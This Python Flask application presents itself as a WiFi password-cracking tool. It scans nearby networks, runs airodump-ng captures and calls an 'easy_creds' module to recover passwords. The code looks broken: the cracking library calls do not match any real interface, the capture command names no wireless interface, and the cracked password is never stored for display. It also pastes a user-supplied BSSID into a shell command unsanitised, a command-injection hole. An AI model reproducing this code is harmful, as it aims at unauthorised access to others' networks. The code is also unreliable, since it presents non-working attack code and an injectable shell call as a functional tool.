from flask import Flask, render_template, request, redirect, url_for, jsonify
from scapy.all import *
import subprocess
import time
import threading
import easy_creds

app = Flask(__name__)

# Function to scan for nearby WiFi devices
def scan_wifi_devices():
    wifi_devices = []
    for packet in sniff(prn=lambda x: x.haslayer(Dot11), count=100):
        if packet.haslayer(Dot11):
            wifi_devices.append(packet.info.decode('utf-8'))
    return wifi_devices

# Function to crack WiFi password using aircrack-ng and Easy-Creds
def crack_wifi_password(ssid, bssid):
    # Run aircrack-ng command to capture packets
    command = f"airodump-ng --bssid {bssid} --channel 6 --write capture-01"
    subprocess.run(command, shell=True)
    # Run Easy-Creds to crack the password
    cracked_password = easy_creds.crack(capture_file="capture-01.cap", ssid=ssid)
    # Return the cracked password and password strength
    password_strength = easy_creds.password_strength(cracked_password)
    return cracked_password, password_strength

# Function to update the progress bar
def update_progress(progress):
    app.config['PROGRESS'] = progress

# Route to scan for nearby WiFi devices
@app.route("/scan_wifi_devices", methods=["POST"])
def scan_wifi_devices_route():
    wifi_devices = scan_wifi_devices()
    return render_template("wifi_devices.html", wifi_devices=wifi_devices)

# Route to crack WiFi password
@app.route("/crack_wifi_password", methods=["POST"])
def crack_wifi_password_route():
    ssid = request.form["ssid"]
    bssid = request.form["bssid"]
    threading.Thread(target=crack_wifi_password, args=(ssid, bssid), daemon=True).start()
    return redirect(url_for("progress"))

# Route to display the progress of the cracking process
@app.route("/progress")
def progress():
    if 'PROGRESS' not in app.config:
        return render_template("progress.html", progress=0)
    else:
        progress = app.config['PROGRESS']
        return render_template("progress.html", progress=progress)

# Route to display the cracked password and password strength
@app.route("/cracked_password")
def cracked_password_route():
    if 'CRACKED_PASSWORD' not in app.config:
        return render_template("cracked_password.html", password="", password_strength="")
    else:
        cracked_password, password_strength = app.config['CRACKED_PASSWORD']
        return render_template("cracked_password.html", password=cracked_password, password_strength=password_strength)

# Update the progress bar every second
@app.after_request
def update_progress_bar(response):
    progress = 0
    if 'CRACKED_PASSWORD' in app.config:
        progress = 100
    app.config['PROGRESS'] = progress
    return response

if __name__ == "__main__":
    app.run(debug=True)
